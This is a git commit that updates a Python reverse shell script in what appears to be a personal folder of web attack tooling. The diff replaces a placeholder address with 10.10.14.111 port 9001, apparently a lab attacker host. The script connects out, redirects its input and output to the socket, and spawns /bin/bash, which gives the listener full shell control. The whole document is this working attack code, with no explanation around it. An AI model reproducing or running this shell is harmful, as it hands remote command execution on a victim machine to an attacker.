4da65e1585e6e9b47b42f9f1a8ce15c4f586a896
Cr0c0 <Cr0c0@cr0c0.0x>
2025-08-09 22:48:08 +0200

    update shell

--- WEB/Shell/python_shell.py
+++ WEB/Shell/python_shell.py
@@ -1,4 +1,4 @@
 import socket,os,pty;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("IP",4444));os.dup2(s.fileno(),0)
+s.connect(("10.10.14.111",9001));os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
